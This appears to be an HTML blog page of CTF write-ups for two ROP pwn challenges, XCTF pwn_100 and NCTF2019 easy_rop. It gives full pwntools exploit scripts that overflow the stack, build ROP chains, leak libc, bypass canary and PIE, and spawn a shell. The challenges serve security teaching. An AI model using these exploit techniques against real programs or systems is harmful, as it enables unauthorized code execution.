@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="风沐云烟" />
+
+
+
+<meta name="description" content="Easy_ROP_I">
+<meta name="keywords" content="ROP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ROP">
+<meta property="og:url" content="http:&#x2F;&#x2F;fmyy.pro&#x2F;2019&#x2F;12&#x2F;10&#x2F;StackOverFlow&#x2F;ROP&#x2F;index.html">
+<meta property="og:site_name" content="FMYY&#39;s Blog">
+<meta property="og:description" content="Easy_ROP_I">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http:&#x2F;&#x2F;fmyy.pro&#x2F;2019&#x2F;12&#x2F;10&#x2F;StackOverFlow&#x2F;ROP&#x2F;2.png">
+<meta property="og:updated_time" content="2020-04-18T10:44:52.872Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;fmyy.pro&#x2F;2019&#x2F;12&#x2F;10&#x2F;StackOverFlow&#x2F;ROP&#x2F;2.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="FMYY&#39;s Blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>ROP | FMYY&#39;s Blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">风沐云烟</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="true" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/Links/">友链</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:itassel@outlook.com" target="_blank" rel="noopener" title="Email"></a>
+                            
+                                <a class="fa QQ" href="tencent://message/?uin=29979004&Site=FMYY&Menu=yes" target="_blank" rel="noopener" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://caoyi.site" target="_blank" rel="noopener">Am473ur</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://wh1sper.cn/" target="_blank" rel="noopener">Wh1sper</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://leukpoint.top/" target="_blank" rel="noopener">LeukPoint</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://youn9.top/" target="_blank" rel="noopener">Youn9</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">2020的划水Pwn手,别人学一天的内容我需要看一个星期</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">风沐云烟</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">风沐云烟</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/Links/">友链</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:itassel@outlook.com" title="Email"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="tencent://message/?uin=29979004&Site=FMYY&Menu=yes" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
+</nav>
+      <div class="body-wrap"><article id="post-StackOverFlow/ROP" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/12/10/StackOverFlow/ROP/" class="article-date">
+      <time datetime="2019-12-10T15:17:11.000Z" itemprop="datePublished">2019-12-10</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ROP
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ROP/" rel="tag">ROP</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="Easy-ROP-I"><a href="#Easy-ROP-I" class="headerlink" title="Easy_ROP_I"></a>Easy_ROP_I</h2><a id="more"></a>
+<p>ROP是一种攻击方式，通常利用程序中的一小段对寄存器的操作进行利用，ROP的进阶还有更大的利用空间，这里记录一个XCTF_Pwn中简单的ROP攻击</p>
+<h3 id="保护措施"><a href="#保护措施" class="headerlink" title="保护措施"></a>保护措施</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="comment"># checksec pwn_100</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    Arch:     amd64-64-little</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    RELRO:    Partial RELRO</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    Stack:    No canary found</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    NX:       NX enabled</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    PIE:      No PIE (0x400000)</span></pre></td></tr></table></figure>
+<p>程序关闭了栈保护和地址随机化，难度降低了很多</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>分析可知需要输入200个字节的长度，而写入的首地址距离RBP仅仅0x40长度，典型的栈溢出，而我们要做的就是将/bin/sh传入某个地方，并调用system函数。<br>但是仅一个read函数，程序也没有后门函数，或者system，/bin/sh的存在，此处我们可以先动态调式一番，然后vmmap查看内存地址中的rwx权限<br><img src="./2.png" alt=""><br>在0x601000地址处具有w权限，而程序又没有PIE，那么这个地址就是程序的绝对地址，我们可以将/bin/sh直接写入到此处<br>此外，我们还需要选择我们需要的gadget构建ROPchain，利用read函数将/bin/sh写入0x601000，而我们需要控制edi和edx以及rsi，所以我们在初始化时init处取得<br>pop_rdi_ret 可以通过命令 ROPgadget –binary ./程序名 –only ‘pop|ret’ 取到地址</p>
+<h3 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">gadget1:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    pop     rbx</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    pop     rbp</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    pop     r12</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    pop     r13</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    pop     r14</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    pop     r15</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    retn</span></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">gadget2:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    mov     rdx, r13</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    mov     rsi, r14</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    mov     edi, r15d</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    call    qword ptr [r12+rbx*<span class="number">8</span>]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    add     rbx, <span class="number">1</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    cmp     rbx, rbp</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    jnz     short loc_400740</span></pre></td></tr></table></figure>
+<p>通过两个gadget，我们可以控制read函数调用时的参数，从而指定read写入，并在执行完加上stop gadget,从而再次回到程序开始，从而泄漏函数的真实地址，则泄露出程序运行的libc版本，需要三次传值，第一次写入命令，第二次泄漏地址，第三次取前两步的结果并成功利用</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>EXP:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,<span class="number">32858</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#p = process('./pwn_100')</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">'./pwn_100'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">'debug'</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">start_main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">start_addr = <span class="number">0x400550</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">binsh_addr = <span class="number">0x00601000</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">gadget1_addr = <span class="number">0x40075A</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">gadget2_addr = <span class="number">0x400740</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">pop_rdi_ret  = <span class="number">0x400763</span> </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'Z'</span>*<span class="number">0x40</span> + p64(<span class="number">0</span>)+ p64(gadget1_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">9</span>)+p64(binsh_addr) +p64(<span class="number">0</span>) + p64(gadget2_addr) + p64(<span class="number">0</span>) * (<span class="number">6</span> + <span class="number">1</span>)+ p64(start_addr)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">payload = payload.ljust(<span class="number">199</span>,<span class="string">'Z'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">p.send(payload)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">'bye~\n'</span>,<span class="string">'/bin/sh\x00'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">payload2 = <span class="string">'Z'</span>*<span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(start_main_got) + p64(puts_plt) + p64(start_addr)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">payload2 = payload2.ljust(<span class="number">199</span>,<span class="string">'Z'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">p.sendline(payload2)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">p.recvline()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">start_main_addr = u64(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">'__libc_start_main'</span>, start_main_addr)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">libcbase = start_main_addr - libc.dump(<span class="string">'__libc_start_main'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#binsh_addr = libcbase + libc.dump('str_bin_sh')</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">rop = <span class="string">'Z'</span>*<span class="number">0x40</span> + p64(<span class="number">0</span>)+ p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">rop = rop.ljust(<span class="number">199</span>,<span class="string">'Z'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">p.sendline(rop)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">p.interactive()</span></pre></td></tr></table></figure>
+<p>下载:<a href="./pwn-100/pwn_100">程序</a> <a href="./pwn-100/exp.py">EXP</a></p>
+<h2 id="Easy-ROP-II"><a href="#Easy-ROP-II" class="headerlink" title="Easy_ROP_II"></a>Easy_ROP_II</h2><p>第二题，我取的是NCTF2019里面的一个ROP题，这个题难度进阶了一下。</p>
+<h3 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$ checksec easy_rop</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    Arch:     amd64-64-little</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    RELRO:    No RELRO</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    Stack:    Canary found</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    NX:       NX enabled</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    PIE:      PIE enabled</span></pre></td></tr></table></figure>
+<p>保护开启了Canary以及PIE，比第一题上升了一定的难度，那么我们先试试IDA静态分析<br>1.首先给数组分配了26*4个字节的空间到栈里，但是需要输入34个int整型值，并每次都会打印此值<br>2.可在BSS段写入一段字符串，写入的大小明显的可栈溢出<br>所以简单的分析后，应思考如何打印出Canary的值或者绕过Canary，不然无法栈溢出，此处有个技巧:在输入的时候，输入+,-不会修改栈中的值  </p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>1.输入 + 或者 - 绕过Canary，然后打印出EBP，获得PIE值<br>2.利用栈迁移，令栈到达最后写入的BSS段处<br>3.在BSS段写入攻击代码，打印出某个函数的实际地址，并取得libc版本<br>4.修改某函数的Got表内保存的地址为execve(“/bin/sh”)的地址，最后调用的函数，令程序执行/bin/sh</p>
+<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">'./easy_rop'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">'./easy_rop'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">context.log_level  = <span class="string">'debug'</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">()</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">	p.sendlineafter(<span class="string">': '</span>,<span class="string">'+'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">	p.recvuntil(<span class="string">' = '</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">	var_one = int(p.recvuntil(<span class="string">'\n'</span>))&amp;<span class="number">0xFFFFFFFF</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">	p.sendlineafter(<span class="string">': '</span>,<span class="string">'-'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">	p.recvuntil(<span class="string">' = '</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">	var_two = (int(p.recvuntil(<span class="string">'\n'</span>))&amp;<span class="number">0xFFFFFFFF</span>)*<span class="number">0x100000000</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">	<span class="keyword">return</span> (var_one + var_two)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Set</span><span class="params">(address)</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">	p.sendlineafter(<span class="string">': '</span>,str((address%<span class="number">0x100000000</span>)))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">	p.sendlineafter(<span class="string">': '</span>,str(address/<span class="number">0x100000000</span>))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">List = []</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">15</span>):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">	List.append(leak())</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">log.success(<span class="string">'Canary:\t'</span> + hex(List[<span class="number">13</span>]))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">log.success(<span class="string">'RBP:\t'</span>+hex(List[<span class="number">14</span>]))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">base = List[<span class="number">14</span>] - <span class="number">0xB40</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">main_addr = base + <span class="number">0xA31</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">migrate_addr = base + <span class="number">0x201420</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">pop_rdi_ret = base +<span class="number">0xBA3</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">pop_rsi_ret = base +<span class="number">0xBA1</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">gadget_one = base + <span class="number">0xB9A</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">gadget_two = base + <span class="number">0xB80</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">Set(base+<span class="number">0xB9D</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">Set(base+<span class="number">0x201408</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">'name?\n'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">rop = p64(pop_rdi_ret) + p64(base+<span class="number">0x201258</span>) + p64(base+<span class="number">0x810</span>) + p64(gadget_one) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(base+<span class="number">0x201258</span>) + p64(<span class="number">9</span>) + p64(base+<span class="number">0x201238</span>) + p64(<span class="number">0</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">rop += p64(gadget_two) + p64(<span class="number">0</span>) * (<span class="number">6</span> + <span class="number">1</span>) + p64(base+<span class="number">0x810</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">p.sendline(rop)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line">read_addr = u64(p.recvuntil(<span class="string">'\n'</span>,drop =<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line">log.success(<span class="string">'Read_Addr:\t'</span> + hex(read_addr))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">'read'</span>,read_addr)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">libcbase = read_addr - libc.dump(<span class="string">'read'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">exec_addr = libcbase + <span class="number">0xE569F</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">p.sendline(p64(exec_addr))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line">p.interactive()</span></pre></td></tr></table></figure>
+<p>下载:<a href="./easy_rop/easy_rop">程序</a> <a href="./easy_rop/exp.py">EXP</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2019/12/16/Fmtstr/FmtStr_Blind_Got/">
+                    FmtStr Blind Got
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019/12/09/%E9%9A%8F%E7%AC%94/Pwn%E9%9A%8F%E7%AC%94/">
+                    Pwn随笔
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-ROP-I"><span class="toc-number">1.</span> <span class="toc-text">Easy_ROP_I</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#保护措施"><span class="toc-number">1.1.</span> <span class="toc-text">保护措施</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span class="toc-number">2.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget"><span class="toc-number">2.1.</span> <span class="toc-text">Gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用"><span class="toc-number">2.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-ROP-II"><span class="toc-number">3.</span> <span class="toc-text">Easy_ROP_II</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#简单分析"><span class="toc-number">3.1.</span> <span class="toc-text">简单分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#思路"><span class="toc-number">3.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-1"><span class="toc-number">3.3.</span> <span class="toc-text">利用</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
